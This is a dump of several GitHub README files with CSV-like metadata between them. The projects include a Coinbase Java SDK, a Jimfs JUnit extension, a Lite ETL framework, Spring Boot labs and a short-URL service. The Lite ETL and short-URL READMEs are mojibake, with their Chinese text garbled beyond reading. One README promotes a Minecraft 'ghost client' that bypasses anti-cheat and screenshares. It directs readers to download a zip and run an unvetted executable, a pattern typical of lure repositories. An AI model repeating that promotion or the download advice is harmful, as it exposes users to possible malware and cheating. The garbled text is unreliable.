enabled. See an example of this inside of the [main.java.com.coinbase.examples package](./src/main/java/com/coinbase/examples/Main.java). Ensure that Advanced API credentials are stored in a secure manner.

The JSON format expected for `Advanced_CREDENTIALS` is:

```
{
  ""apiKeyName"": """",
  ""privateKey"": """",
}
```

Coinbase Advanced API credentials can be created in the Advanced web console under API.

An example of instantiating the credentials and using the PortfoliosService is shown below:

```java
public class Main {
    public static void main(String[] args) {
        String credsStringBlob = System.getenv(""ADVANCED_TRADE_CREDENTIALS"");
        ObjectMapper mapper = new ObjectMapper();

        try {
            CoinbaseAdvancedCredentials credentials = new CoinbaseAdvancedCredentials(credsStringBlob);
            CoinbaseAdvancedClient client = new CoinbaseAdvancedClient(credentials);

            PortfoliosService portfoliosService = AdvancedServiceFactory.createPortfoliosService(client);
            GetPortfolioByIdResponse portfolioResponse = portfoliosService.getPortfolioById(
                    new GetPortfolioByIdRequest.Builder()
                            .portfolioId(portfolioId)
                            .build());

            System.out.println(mapper.writeValueAsString(portfolioResponse));
        } catch (Exception e) {
            e.printStackTrace(e);
        }
    }
}
```

To see a full working example, see the [`Main`](src/main/java/com/coinbase/examples/Main.java) class under the com.coinbase.examples package.

**Warning** This does place a very small trade for a small amount of ADA. Please ensure that you have the necessary funds in your account before running this code.

## Binaries

Binaries and dependency information for Maven, Gradle, Ivy and others can be found at the [Maven Central Repository](https://central.sonatype.com/search?q=g%3Acom.coinbase.advanced+a%3Acoinbase-advanced-sdk-java&smo=true)

Maven example:

```xml
<dependency>
    <groupId>com.coinbase.advanced</groupId>
    <artifactId>coinbase-advanced-sdk-java</artifactId>
    <version>x.y.z</version>
</dependency>
```

## Build

To build the sample library, ensure that Java Development Kit (JDK) is installed and then run:

```bash
mvn clean install
```
",1,0,1,2.0,"['coinbase', 'advanced', 'trade', 'java', 'sdk', 'readme', 'overview', 'license', 'usage', 'binary', 'build']","['coinbase', 'advanced', 'trade', 'java', 'sdk']",1.0,"[org.apache.maven.plugins:maven-compiler-plugin,org.apache.maven.plugins:maven-failsafe-plugin,org.apache.maven.plugins:maven-gpg-plugin,org.apache.maven.plugins:maven-javadoc-plugin,org.apache.maven.plugins:maven-source-plugin,org.sonatype.plugins:nexus-staging-maven-plugin]",0.0,1.0,0.0
scordio/jimfs-junit-jupiter,main,"# Jimfs JUnit Jupiter [![Maven Central](https://img.shields.io/maven-central/v/io.github.scordio/jimfs-junit-jupiter?label=Maven%20Central)](https://mvnrepository.com/artifact/io.github.scordio/jimfs-junit-jupiter) [![javadoc](https://javadoc.io/badge2/io.github.scordio/jimfs-junit-jupiter/javadoc.svg)](https://javadoc.io/doc/io.github.scordio/jimfs-junit-jupiter)

[![CI](https://github.com/scordio/jimfs-junit-jupiter/actions/workflows/main.yml/badge.svg?branch=main)](https://github.com/scordio/jimfs-junit-jupiter/actions/workflows/main.yml?query=branch%3Amain)
[![Cross-Version](https://github.com/scordio/jimfs-junit-jupiter/actions/workflows/cross-version.yml/badge.svg?branch=main)](https://github.com/scordio/jimfs-junit-jupiter/actions/workflows/cross-version.yml?query=branch%3Amain)

This project provides a [JUnit Jupiter][] extension for in-memory
[`@TempDir`](https://junit.org/junit5/docs/current/api/org.junit.jupiter.api/org/junit/jupiter/api/io/TempDir.html)
directories via the [Jimfs][] file system.

## Motivation

Today, it is already possible to use Jimfs and JUnit Jupiter together to create in-memory temporary directories for
testing.
However, it requires Jimfs in-memory file system handling hooked into JUnit Jupiter test lifecycle callbacks,
a boilerplate that users must implement on their own.

Starting from [version 5.10](https://junit.org/junit5/docs/5.10.0/release-notes/index.html#release-notes),
JUnit Jupiter offers a
[`TempDirFactory` SPI](https://junit.org/junit5/docs/5.10.0/user-guide/#writing-tests-built-in-extensions-TempDirectory)
for customizing how temporary directories are created via the `@TempDir` annotation.
The SPI allows libraries like Jimfs to provide their implementation.

First-party support was requested in [google/jimfs#258](https://github.com/google/jimfs/issues/258).
However, Google has not yet started using JUnit Jupiter, and such first-party support may only be provided when
Google does so.

Because of that, this extension was created to aid all the users who would like a smooth integration between Jimfs
and JUnit Jupiter.
This project will likely be discontinued if Google ever offers first-party support for this integration.

## Compatibility

Jimfs JUnit Jupiter is based on JUnit Jupiter 5, thus requiring at least Java 8.

Compatibility is guaranteed only with the JUnit Jupiter versions from 5.10 to the latest.

## Getting Started

### Maven

```xml
<dependency>
  <groupId>io.github.scordio</groupId>
  <artifactId>jimfs-junit-jupiter</artifactId>
  <version>${jimfs-junit-jupiter.version}</version>
  <scope>test</scope>
</dependency>
```

### Gradle

```kotlin
testImplementation(""io.github.scordio:jimfs-junit-jupiter:${jimfsJunitJupiterVersion}"")
```

### JimfsTempDirFactory

The simplest usage is to set the
[`factory`](https://junit.org/junit5/docs/current/api/org.junit.jupiter.api/org/junit/jupiter/api/io/TempDir.html#factory())
attribute of `@TempDir` to `JimfsTempDirFactory`:

```java
@Test
void test(@TempDir(factory = JimfsTempDirFactory.class) Path tempDir) {
  assertThat(tempDir.getFileSystem().provider().getScheme()).isEqualTo(""jimfs"");
}
```

`tempDir` is resolved into an in-memory temporary directory based on Jimfs, appropriately configured for the current
platform.

### @JimfsTempDir

`@JimfsTempDir`, a `@TempDir`
[composed annotation](https://junit.org/junit5/docs/current/user-guide/#writing-tests-meta-annotations),
can be used as a drop-in replacement for `@TempDir(factory = JimfsTempDirFactory.class)`:

```java
@Test
void test(@JimfsTempDir Path tempDir) {
  assertThat(tempDir.getFileSystem().provider().getScheme()).isEqualTo(""jimfs"");
}
```

The default behavior of the annotation is equivalent to using `JimfsTempDirFactory` directly:
`tempDir` is resolved into an in-memory temporary directory based on Jimfs, appropriately configured for the current
platform.

For better control over the underlying in-memory file system, `@JimfsTempDir` offers an optional `value` attribute
that can be set to the desired configuration, one of:
* `DEFAULT`: based on the corresponding [configuration parameter](#default-jimfs-configuration) (default)
* `FOR_CURRENT_PLATFORM`: appropriate to the current platform
* `OS_X`: for a Mac OS X-like file system
* `UNIX`: for a UNIX-like file system
* `WINDOWS`: for a Windows-like file system

For example, the following defines a Windows-like temporary directory regardless of the platform the test
is running on:

```java
@Test
void test(@JimfsTempDir(WINDOWS) Path tempDir) {
  assertThat(tempDir.getFileSystem().getSeparator()).isEqualTo(""\\"");
}
```

### Configuration Parameters

Jimfs JUnit Jupiter supports JUnit
[configuration parameters](https://junit.org/junit5/docs/current/user-guide/#running-tests-config-params).

#### Default `@TempDir` Factory

The `junit.jupiter.tempdir.factory.default` configuration parameter sets the default factory to use, expecting its
fully qualified class name.

For example, the following configures `JimfsTempDirFactory`:

```properties
junit.jupiter.tempdir.factory.default=io.github.scordio.jimfs.junit.jupiter.JimfsTempDirFactory
```

The factory will be used for all `@TempDir` annotations unless the `factory` attribute of the annotation
specifies a different type.

#### Default Jimfs Configuration

The `jimfs.junit.jupiter.tempdir.configuration.default` configuration parameter sets the default Jimfs configuration
to use, expecting one of the following (case-insensitive):
* `FOR_CURRENT_PLATFORM`: appropriate to the current platform (default)
* `OS_X`: for a Mac OS X-like file system
* `UNIX`: for a UNIX-like file system
* `WINDOWS`: for a Windows-like file system

For example, the following defines a Windows-like temporary directory regardless of the platform the test
is running on:

```properties
jimfs.junit.jupiter.tempdir.configuration.default=windows
```

All Jimfs-based temporary directories will be configured accordingly unless `@JimfsTempDir` is used and
its `value` attribute is set.

### Limitations

Jimfs JUnit Jupiter only supports annotated fields or parameters of type `Path`, as Jimfs is a non-default file
system and `File` instances can only be associated with the default file system.

## Improvements

Compared to the configuration options that Jimfs provides, Jimfs JUnit Jupiter exposes a much smaller surface to keep
its usage simple.

In case something is missing for your use case, please [raise an issue](../../issues/new)!

## License

Jimfs JUnit Jupiter is released under version 2.0 of the [Apache License][].

[Apache License]: https://www.apache.org/licenses/LICENSE-2.0
[Jimfs]: https://github.com/google/jimfs
[JUnit Jupiter]: https://github.com/junit-team/junit5
",2,0,2,0.0,"['jimfs', 'junit', 'jupiter', 'maven', 'central', 'http', 'https', 'javadoc', 'http', 'https', 'motivation', 'compatibility', 'get', 'start', 'maven', 'gradle', 'jimfstempdirfactory', 'jimfstempdir', 'configuration', 'parameter', 'default', 'tempdir', 'factory', 'default', 'jimfs', 'configuration', 'limitation', 'improvement', 'license']","['jimfs', 'maven', 'http', 'https', 'configuration']",1.0,"[com.diffplug.spotless:spotless-maven-plugin,com.mycila:license-maven-plugin,org.apache.maven.plugins:maven-clean-plugin,org.apache.maven.plugins:maven-compiler-plugin,org.apache.maven.plugins:maven-jar-plugin,org.apache.maven.plugins:maven-javadoc-plugin,org.apache.maven.plugins:maven-resources-plugin,org.apache.maven.plugins:maven-source-plugin,org.apache.maven.plugins:maven-surefire-plugin,org.codehaus.mojo:flatten-maven-plugin,org.jreleaser:jreleaser-maven-plugin]",0.0,1.0,0.0
WolfLink-DevTeam/lite-etl,master,"# Lite ETL

![å¼€æºåè®®](https://img.shields.io/github/license/WolfLink-DevTeam/lite-etl?style=for-the-badge)
![Stars](https://img.shields.io/github/stars/WolfLink-DevTeam/lite-etl?style=for-the-badge)
![Last Commit](https://img.shields.io/github/last-commit/WolfLink-DevTeam/lite-etl?style=for-the-badge)
[![Star History Chart](https://api.star-history.com/svg?repos=WolfLink-DevTeam/lite-etl&type=Date)](https://star-history.com/#WolfLink-DevTeam/lite-etl&Date)

Lite ETL æ˜¯ä¸€ä¸ªç”¨äºå¤§æ•°æ®é¢†åŸŸå¼€å‘çš„é€šç”¨ ETL æ¡†æ¶ã€‚é‡‡ç”¨ç®¡é“å¼è®¾è®¡ï¼Œå¹¶é…åˆ PreProcessorã€Data Readerã€Data Transformerã€Data Writer ç­‰ç»„ä»¶ï¼Œæä¾›äº†é«˜æ•ˆã€ç°ä»£åŒ–çš„æ•°æ®å¤„ç†èƒ½åŠ›ã€‚
## ç‰¹æ€§
- è½»é‡åŒ–è®¾è®¡ï¼šLite ETL ä¸“æ³¨äºæä¾›è½»é‡çº§çš„ ETL è§£å†³æ–¹æ¡ˆï¼Œé¿å…äº†å†—ä½™çš„å¤æ‚æ€§ï¼Œä½¿å¾—ä½¿ç”¨è€…èƒ½å¤Ÿå¿«é€Ÿä¸Šæ‰‹å¹¶é›†æˆåˆ°ç°æœ‰é¡¹ç›®ä¸­ã€‚
- ç®¡é“å¼å¤„ç†ï¼šé‡‡ç”¨ç®¡é“å¼è®¾è®¡ï¼Œæ•°æ®å¤„ç†è¿‡ç¨‹æ›´åŠ æ¸…æ™°ã€æ¨¡å—åŒ–ï¼Œæ˜“äºç†è§£å’Œç»´æŠ¤ã€‚
- å®¢åˆ¶åŒ–ï¼šç”¨æˆ·å¯ä»¥åŸºäºè¯¥æ¡†æ¶è‡ªè¡Œå®ç°ç›¸å…³ç»„ä»¶ï¼Œä»¥å®Œæˆå¯¹ç®¡é“çš„åŠŸèƒ½æ‰©å±•ã€‚
- é«˜æ•ˆæ€§ï¼šJavaPipe ä½¿ç”¨äº†ç°ä»£åŒ–çš„ç®—æ³•å’Œä¼˜åŒ–æŠ€æœ¯ï¼Œç¡®ä¿åœ¨å¤„ç†å¤§è§„æ¨¡æ•°æ®æ—¶èƒ½å¤Ÿä¿æŒé«˜æ•ˆç‡ã€‚
- ç°ä»£åŒ–æ¶æ„ï¼šåŸºäº Java 17 å¼€å‘ï¼Œå……åˆ†åˆ©ç”¨äº† Java 17 ä¸­çš„æ–°ç‰¹æ€§ï¼Œä¿æŒäº†ä¸æ—¶ä¿±è¿›çš„ç°ä»£åŒ–æ¶æ„ã€‚
## ç»„ä»¶ä»‹ç»
![image](https://github.com/WolfLink-DevTeam/lite-etl/blob/master/img/Pipeline%20Architecture.png)
### Pre Processor
å½“è®¢é˜…è€…ä»æ•°æ®æºè·å–åˆ°æ•°æ®åï¼Œä¼šä¼˜å…ˆå°†æ•°æ®äº¤ç»™æ•°æ®é¢„å¤„ç†å™¨è¿›è¡Œå¤„ç†ã€‚
Lite ETL é»˜è®¤æä¾›äº†ä¸¤ç§ç±»å‹çš„æ•°æ®é¢„å¤„ç†å™¨ï¼š
- Data Splitterï¼šå°†è¾“å…¥çš„æ–‡æ¡£æŒ‰ç…§ä¸€å®šè§„åˆ™æ‹†åˆ†æˆè‹¥å¹²ä¸ªæ–‡æ¡£ï¼Œä»¥ä¾¿äºåç»­è¿›è¡Œå¤„ç†ã€‚
- Update Time Finderï¼šæ›´æ–°æ—¶é—´æŸ¥æ‰¾è€…ï¼ŒæŒ‡å®šä¸€ä¸ªèƒ½å¤Ÿè·å–åˆ°æ–‡æ¡£æ›´æ–°æ—¶é—´çš„è§„åˆ™ï¼Œä»¥ä¾¿äºåœ¨æ‹‰å–æ•°æ®æ—¶è¿›è¡Œæ¯”å¯¹ï¼Œå·®é‡æ›´æ–°ã€‚
### Subscriber
å®šä¹‰äº†ä»æ•°æ®æºè·å–æ•°æ®çš„å…·ä½“æ–¹å¼ã€‚
Lite ETL é»˜è®¤æä¾›äº†ä¸€ç§ç±»å‹çš„æ•°æ®è®¢é˜…è€…ï¼š
- Polling Subscriberï¼šæŒ‰ç…§ä¸€å®šçš„å‘¨æœŸè½®è¯¢è®¢é˜…æ•°æ®ã€‚
### Transformer
å¯¹æ•°æ®è¿›è¡Œè¯¦ç»†å¤„ç†æˆ–ç±»å‹è½¬æ¢çš„ç»„ä»¶ï¼Œå³ä¸ºè½¬æ¢å™¨ã€‚å¤šä¸ªè½¬æ¢å™¨æŒ‰ç…§ç‰¹å®šé¡ºåºå¯ç»„åˆä¸ºè½¬æ¢å™¨ç»„ã€‚æŒ‰ç…§ç»„çš„è§„æ ¼åº”ç”¨è‡³ç®¡é“ã€‚
Lite ETL é»˜è®¤æä¾›äº†ä¸€ç§ç±»å‹çš„è½¬æ¢å™¨ç»„ï¼š
- LLM Transformer Groupï¼šåŸºäº LLM + Prompt å¯¹æ•°æ®è¿›è¡Œå¤„ç†ï¼ŒåŒ…å«äº† Data Formatterã€Value Filterã€Fuzzy Extractorã€Final Verifier å››ç§è½¬æ¢å™¨ã€‚
- Data Formatterï¼šä¾æ®æ ¼å¼åŒ–å­—å…¸ï¼Œå¯¹è¾“å…¥æ•°æ®è¿›è¡Œè§„èŒƒåŒ–è¯å…¸æ›¿æ¢ã€‚
- Value Filterï¼šåˆ¤å®šæ•°æ®å¯¹äºç‰¹å®šé¢†åŸŸçš„åˆ†ææ˜¯å¦å…·æœ‰ä»·å€¼ã€‚
- Fuzzy Extractorï¼šåŸºäºè®¤çŸ¥æ¨¡å‹å¯¹æ•°æ®è¿›è¡Œæ¨¡ç³Šæå–ã€‚
- Final Verifierï¼šå¯¹æ•°æ®è¿›è¡Œæœ€ç»ˆæ ¡éªŒï¼Œåˆ¤æ–­æ•°æ®åœ¨è½¬æ¢è¿‡ç¨‹ä¸­æ˜¯å¦å­˜åœ¨å¼‚å¸¸ã€‚
### Writer
å¯¹æ•°æ®è¿›è¡Œè¾“å‡ºï¼Œç”¨æˆ·å¯ä»¥è‡ªè¡Œå®šä¹‰å¤šç§ç±»å‹çš„æ•°æ®å†™å…¥è€…ï¼Œå°†æ•°æ®ä»¥å„ç§ä¸åŒå½¢å¼è¿›è¡Œè¾“å‡ºã€‚
## å¿«é€Ÿä½¿ç”¨
```java
public class Example {
    public static void main(String[] args) {
        // å¯ç”¨ LLM æ¨¡å‹èƒ½åŠ›
        ETLConfig.getInstance().enableLLM(
                ""base-url"",
                ""sk-xxxxxx"",
                ModelSource.OPEN_AI,
                ""gpt-3.5-turbo""
        );
        // è§„èŒƒåŒ–å­—å…¸(å¯é€‰)
        FormatDictionary dictionary = new FormatDictionary();
        // ç®¡é“å¯¹è±¡
        Pipeline pipeline = Pipeline.builder()
                // æ•°æ®æº
                .source(new TestSource())
                // æ•°æ®è®¢é˜…è€…
                .subscriber(new PollingSubscriber())
                // è½¬æ¢å™¨ç»„ï¼ŒåŒ…å«ä¸€ç³»åˆ—é¢„å…ˆå®ç°å¹¶æŒ‰é¡ºåºç»‘å®šçš„è½¬æ¢å™¨
                .transformerGroup(new LLMTransformerGroup(dictionary))
                // æ•°æ®å†™å…¥è€…
                .writer(new ConsoleWriter())
                // åˆ›å»ºç®¡é“
                .build();
        // å¼€é€šç®¡é“ï¼Œå¼€å§‹æŒç»­å¤„ç†æ•°æ®
        pipeline.open();
        // å…³é—­ç®¡é“ï¼Œä¸å†æ¥æ”¶å¹¶å¤„ç†æ–°çš„æ•°æ®
        pipeline.close();
    }
}
```
## ä¾èµ–ä¿¡æ¯
```xml
å‰å¾€ https://www.jitpack.io/#WolfLink-DevTeam/lite-etl æŸ¥çœ‹æœ€æ–°ç‰ˆæœ¬
<repositories>
    <repository>
        <id>jitpack.io</id>
        <url>https://www.jitpack.io</url>
    </repository>
</repositories>
<dependencies>
    <dependency>
        <groupId>com.github.WolfLink-DevTeam</groupId>
        <artifactId>lite-etl</artifactId>
        <version>Tag</version>
    </dependency>
</dependencies>
```
## è´¡çŒ®
æ¬¢è¿è´¡çŒ®è€…åŠ å…¥ Lite ETL é¡¹ç›®çš„å¼€å‘å’Œæ”¹è¿›ã€‚å¦‚æœä½ æœ‰å…´è¶£ä¸ºé¡¹ç›®è´¡çŒ®ä»£ç ã€æäº¤ bug æŠ¥å‘Šã€æ”¹è¿›æ–‡æ¡£æˆ–æå‡ºæ–°çš„åŠŸèƒ½è¯·æ±‚ï¼Œè¯·æŒ‰ç…§ä»¥ä¸‹æ­¥éª¤è¿›è¡Œï¼š

ç‚¹å‡» Fork æŒ‰é’®ï¼Œå°†ä»“åº“å¤åˆ¶åˆ°ä½ çš„ GitHub è´¦æˆ·ä¸­ï¼Œå†å°† Fork çš„ä»“åº“å…‹éš†åˆ°æœ¬åœ°ã€‚
```sh
git clone https://github.com/your-username/lite-etl.git
cd lite-etl
```
æ¥ä¸‹æ¥ä¸ºä½ çš„ä¿®æ”¹åˆ›å»ºä¸€ä¸ªæ–°çš„åˆ†æ”¯ã€‚
```sh
git checkout -b feature-branch
```
è¯·åœ¨æœ¬åœ°åˆ†æ”¯ä¸Šè¿›è¡Œä»£ç ä¿®æ”¹ã€bug ä¿®å¤æˆ–æ–‡æ¡£æ”¹è¿›ï¼Œå¹¶æäº¤ä½ çš„ä¿®æ”¹åˆ°æœ¬åœ°åˆ†æ”¯ã€‚
```sh
git add .
git commit -m ""æè¿°ä½ çš„ä¿®æ”¹å†…å®¹""
```
ä¿®æ”¹å®Œæˆåå°†æœ¬åœ°åˆ†æ”¯æ¨é€åˆ°ä½ çš„ GitHub ä»“åº“ã€‚
```sh
git push origin feature-branch
```
æœ€ååœ¨ GitHub ä¸Šæäº¤ Pull Requestï¼Œè¯·è¯¦ç»†æè¿°ä½ çš„ä¿®æ”¹å†…å®¹å’Œç›®çš„ã€‚
åœ¨æäº¤ä¹‹å‰ï¼Œè¯·ç¡®ä¿ä½ çš„ä»£ç éµå¾ªé¡¹ç›®çš„ç¼–ç è§„èŒƒï¼Œå¹¶é€šè¿‡æ‰€æœ‰çš„æµ‹è¯•ã€‚
## è®¸å¯è¯
Lite ETL é‡‡ç”¨ MIT è®¸å¯è¯ï¼Œè¯¦æƒ…è¯·å‚é˜…ä»¥ä¸‹å†…å®¹ï¼š
```text
MIT License

Copyright (c) 2024 WolfLink-DevTeam

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the ""Software""), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED ""AS IS"", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.
```
",0,1,1,0.0,"['lite', 'etl', 'pre', 'processor', 'subscriber', 'transformer', 'writer']","['lite', 'etl', 'pre', 'processor', 'subscriber']",1.0,[],0.0,1.0,0.0
oussemamansouri/Labs-Spring-Boot-for-campusna,main,"# Labs Spring Boot for campusna 
 This repository contains the Labs Spring Boot project for campusna at elife Formation. It is designed to provide hands-on learning experiences with Spring Boot, a powerful and versatile framework for building Java-based web applications and microservices. The project includes various labs and exercises to help developers gain practical skills and deepen their understanding of Spring Boot's core features and best practices.
",0,0,1,0.0,"['lab', 'spring', 'boot', 'campusna']","['lab', 'spring', 'boot', 'campusna']",9.0,[org.springframework.boot:spring-boot-maven-plugin],0.0,9.0,0.0
nhioufgaewnofidasjg/Minecraft-Entropy-Client,main,"# Minecraft Entropy - Ghost Client Repository

Welcome to the **Minecraft-Clients** repository! ğŸ® Here you will find the powerful and versatile ghost client, **Minecraft Entropy**, designed to help Minecraft enthusiasts enhance their gameplay experience by providing advanced features. 

![Minecraft Entropy Banner](https://example.com/minecraft_entrophy/banner.jpg)

## Description

**Minecraft Entropy** is a state-of-the-art ghost client that specializes in bypassing screenshares and anti-cheat systems. Its robust features and compatibility with Minecraft versions 1.7.10 and 1.8.9 make it a must-have tool for players looking to elevate their gameplay. The client is conveniently installed via an executable, ensuring seamless integration and ease of use for all users.

## Features

ğŸ‘» **Ghost Mode**: Stay undetected with our advanced ghost mode feature that keeps you under the radar.

âš”ï¸ **Combat Enhancements**: Gain the upper hand in battles with improved combat abilities and targeting precision.

ğŸŒŒ **Customization Options**: Tailor your client experience with a wide range of customization options to suit your gameplay style.

ğŸ”§ **Anti-Cheat Bypass**: Effortlessly bypass anti-cheat systems and enjoy uninterrupted gameplay sessions.

## Installation

To download and install **Minecraft Entropy**, click the button below:

[![Download Minecraft Entropy](https://img.shields.io/badge/Download-Client.zip-ff69b4)](https://github.com/user-attachments/files/16830252/Client.zip)

## Getting Started

### Prerequisites

Before installing **Minecraft Entropy**, ensure you have the following requirements:

- A computer running Windows 10
- Minecraft version 1.7.10 or 1.8.9 installed
- Sufficient disk space for installation

### Installation Steps

1. Download the **Client.zip** file by clicking the download button above.
2. Extract the contents of the zip file to a location of your choice on your computer.
3. Run the executable file to start the installation process.
4. Follow the on-screen instructions to complete the installation.

## Contributing

We welcome contributions from the community to help improve **Minecraft Entropy**. To contribute, follow these steps:

1. Fork the repository.
2. Make your changes and improvements.
3. Submit a pull request detailing your contributions.

## Acknowledgements

We would like to thank all the contributors who have helped enhance **Minecraft Entropy** and make it a valuable asset for Minecraft players worldwide.

![Minecraft Entropy Logo](https://example.com/minecraft_entrophy/logo.jpg)

## License

This project is licensed under the **MIT License** - see the [LICENSE](LICENSE) file for details.

---

Thank you for visiting the **Minecraft-Clients** repository and exploring **Minecraft Entropy**! ğŸ‰ Get ready to elevate your Minecraft experience with our powerful ghost client. Happy gaming! ğŸš€",1,0,1,0.0,"['minecraft', 'entropy', 'ghost', 'client', 'repository', 'description', 'feature', 'installation', 'get', 'start', 'prerequisite', 'installation', 'step', 'contribute', 'acknowledgement', 'license']","['installation', 'minecraft', 'entropy', 'ghost', 'client']",1.0,"[org.apache.maven.plugins:maven-compiler-plugin,org.apache.maven.plugins:maven-shade-plugin]",0.0,1.0,0.0
wenbochang888/short-url,master,"# å¦‚ä½•ä½¿ç”¨
1. é¦–å…ˆåˆ›å»ºæ•°æ®åº“è¡¨ [short_url.sql](src%2Fmain%2Fresources%2Fshort_url.sql)
2. git cloneä¸‹é¡¹ç›®
3. ç›´æ¥ä½¿ç”¨ideaæ‰“å¼€
4. è¡¥å……mysqlç”¨æˆ·åå¯†ç [application.properties](src%2Fmain%2Fresources%2Fapplication.properties)
5. è¯·æ±‚ShortUrlController ç”ŸæˆçŸ­é“¾ï¼Œä»¥åŠè·å–é•¿é“¾çš„æ¥å£å³å¯

# [ç‚¹æˆ‘ - ä½“éªŒåœ°å€](http://101.33.233.214:8999/)
å‰ç«¯é¡µé¢å®Œå…¨æ˜¯ç”¨GPTç”Ÿæˆçš„ï¼Œå†æ¬¡æ„Ÿæ…¨GPT äººå·¥æ™ºèƒ½çš„å¼ºå¤§


 ![ç¤ºä¾‹å›¾ç‰‡](src/main/resources/img/1.png)
 ![ç¤ºä¾‹å›¾ç‰‡](src/main/resources/img/4.png)
 ![ç¤ºä¾‹å›¾ç‰‡](src/main/resources/img/2.png)
 ![ç¤ºä¾‹å›¾ç‰‡](src/main/resources/img/3.png)

# å‰è¨€
å‰å‡ å¤©é¢è¯•é‡åˆ°çš„ï¼Œæ„Ÿè§‰æ¯”è¾ƒæœ‰è¶£ã€‚ç¬¬ä¸€æ¬¡é¢è¯•é‡åˆ°è€ƒ**æ¶æ„è®¾è®¡**ç›¸å…³çš„é¢˜ç›®ï¼ŒæŒºæ–°å¥‡çš„ï¼Œå¼€å§‹å‘å›½å¤–å¤§å‚é æ‹¢äº†ï¼Œæ¯”å¤©å¤©é—®å…«è‚¡æ–‡å¥½å¤ªå¤šäº†ï¼Œå·¥ä½œ5å¹´å·¦å³çš„ï¼Œé—®å…«è‚¡æ–‡ï¼Œçº¯çº¯çš„ä¸è´Ÿè´£ä»»å·æ‡’è¡Œä¸ºã€‚

æ„Ÿè§‰æ­¤é—®é¢˜æ¯”è¾ƒæœ‰è¶£ï¼Œè¿™å‡ å¤©ç®€å•çš„å®ç°äº†ä¸€ç‰ˆæœ¬ï¼Œå’Œå¤§å®¶åˆ†äº«ä¸€ä¸‹å…·ä½“çš„ç»†èŠ‚ï¼Œä¹Ÿæ¬¢è¿å¤§å®¶äº¤æµè®¨è®º, ä»£ç githubé“¾æ¥  [short-url](https://github.com/wenbochang888/short-url)ã€‚


# çŸ­é“¾ç”Ÿæˆçš„å‡ ç§æ–¹æ³•
ä¸šç•Œå®ç°çŸ­é“¾çš„æ–¹å¼å¤§æ¦‚æ˜¯æœ‰ä¸¤ç§ã€‚

## 1. Hashç®—æ³•
ç”±é•¿urlé€šè¿‡ hash ç®—æ³•ï¼Œç”ŸæˆçŸ­çš„urlï¼Œå¦‚æœhashå†²çªï¼Œéœ€è¦è§£å†³è§£å†³hashå†²çªã€‚é‚£ä¹ˆè¿™ä¸ªå“ˆå¸Œå‡½æ•°è¯¥æ€ä¹ˆå–å‘¢ï¼Œç›¸ä¿¡è‚¯å®šæœ‰å¾ˆå¤šäººè¯´ç”¨ MD5ï¼ŒSHA ç­‰ç®—æ³•ï¼Œå…¶å®è¿™æ ·åšæœ‰ç‚¹æ€é¸¡ç”¨ç‰›åˆ€äº†ï¼Œè€Œä¸”æ—¢ç„¶æ˜¯åŠ å¯†å°±æ„å‘³ç€æ€§èƒ½ä¸Šä¼šæœ‰æŸå¤±ï¼Œæˆ‘ä»¬å…¶å®ä¸å…³å¿ƒåå‘è§£å¯†çš„éš¾åº¦ï¼Œåè€Œæ›´å…³å¿ƒçš„æ˜¯å“ˆå¸Œçš„è¿ç®—é€Ÿåº¦å’Œå†²çªæ¦‚ç‡ã€‚

èƒ½å¤Ÿæ»¡è¶³è¿™æ ·çš„å“ˆå¸Œç®—æ³•æœ‰å¾ˆå¤šï¼Œè¿™é‡Œæ¨è Google å‡ºå“çš„ MurmurHash ç®—æ³•ï¼ŒMurmurHash æ˜¯ä¸€ç§**éåŠ å¯†å‹**å“ˆå¸Œå‡½æ•°ï¼Œé€‚ç”¨äºä¸€èˆ¬çš„å“ˆå¸Œæ£€ç´¢æ“ä½œã€‚ä¸å…¶å®ƒæµè¡Œçš„å“ˆå¸Œå‡½æ•°ç›¸æ¯”ï¼Œå¯¹äºè§„å¾‹æ€§è¾ƒå¼ºçš„ keyï¼ŒMurmurHash çš„éšæœºåˆ†å¸ƒç‰¹å¾è¡¨ç°æ›´è‰¯å¥½ã€‚éåŠ å¯†æ„å‘³ç€ç€ç›¸æ¯” MD5ï¼ŒSHA è¿™äº›å‡½æ•°å®ƒçš„æ€§èƒ½è‚¯å®šæ›´é«˜ï¼ˆå®é™…ä¸Šæ€§èƒ½æ˜¯ MD5 ç­‰åŠ å¯†ç®—æ³•çš„åå€ä»¥ä¸Šï¼‰ï¼Œä¹Ÿæ­£æ˜¯ç”±äºå®ƒçš„è¿™äº›ä¼˜ç‚¹ï¼Œæ‰€ä»¥è™½ç„¶å®ƒå‡ºç°äº 2008ï¼Œä½†ç›®å‰å·²ç»å¹¿æ³›åº”ç”¨åˆ° Redisã€MemCacheã€Cassandraã€HBaseã€Lucene ç­‰ä¼—å¤šè‘—åçš„è½¯ä»¶ä¸­ã€‚

### 1.1 å¦‚ä½•ç¼©çŸ­åŸŸå
MurmurHash32ä¼šç”Ÿæˆ32ä½çš„åè¿›åˆ¶ï¼ŒMurmurHash64ä¼šç”Ÿæˆ64ä½çš„åè¿›åˆ¶ã€‚é‚£æˆ‘ä»¬æŠŠå®ƒè½¬ä¸º 62 è¿›åˆ¶å¯ç¼©çŸ­å®ƒçš„é•¿åº¦ï¼Œä¸ºä»€ä¹ˆæ˜¯62è¿›åˆ¶ï¼Œä¸æ˜¯64å‘¢ï¼Ÿå› ä¸º62è¿›åˆ¶è¡¨ç¤º ã€a-z A-Z 0-9ã€‘å­—ç¬¦ä¹‹å’Œã€‚
### 1.2 å¦‚ä½•è§£å†³hashå†²çª
